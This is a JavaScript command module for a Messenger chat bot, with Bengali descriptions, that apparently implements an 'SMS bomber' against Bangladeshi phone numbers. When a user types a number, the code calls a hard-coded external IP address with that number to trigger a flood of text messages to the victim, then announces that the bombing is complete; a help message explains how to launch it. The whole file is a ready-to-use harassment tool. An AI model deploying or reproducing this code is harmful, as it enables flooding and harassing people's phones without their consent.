module.exports.config = {
  name: "sms",
  version: "1.0.0",
  hasPermssion: 0, //DONT CHANGE THIS MODIFIER CREDIT TANVIR-TAMIM
  credits: "TANVIR-TAMIM",
  description: "এসএমএস বোম্বার, শুধুমাত্র বাংলাদেশি নাম্বারের জন্য প্রযোজ্য",
  commandCategory: "Tool",
  usages: "/sms number text",
  cooldowns: 15,
  dependencies: {"axios" : ""}
};
module.exports.run = async({api, event, args}) => {
	const axios = require('axios');
	if (args[0]) {
  api.sendMessage(`এসএমএস বোম্বিং হচ্ছে...`, event.threadID, (err, info) => setTimeout(() => { api.unsendMessage(info.messageID) }, 90000));
	let i1 = (args[0]) //sms bomb api // fixed by TANVIR-TAMIM // dont harm this //
	const res = await axios.get(`http://206.189.134.221/wordpress/wp-content/uploads/bmb/${i1}`);
	return api.sendMessage(`- এসএমএস বোম্বিং সম্পূর্ন 🌼\n`, event.threadID, event.messageID)
} //modifi credit - fixed by TANVIR-TAMIM
else if (args.join() == "") { 
	  return api.sendMessage(`🌼••SMS BOMBER 𝐉𝐔𝐍𝐈𝐎𝐑 𝐓𝐎𝐌 BOT••🌼\n\nএসএমএস বোম্বিং করতে /sms লিখে নাম্বার লেখো🥰(with out +00 ) \n\nপ্রতিবারে সর্বোচ্চ ৫ টি মেসেজ যাবে`, event.threadID, event.messageID)}
}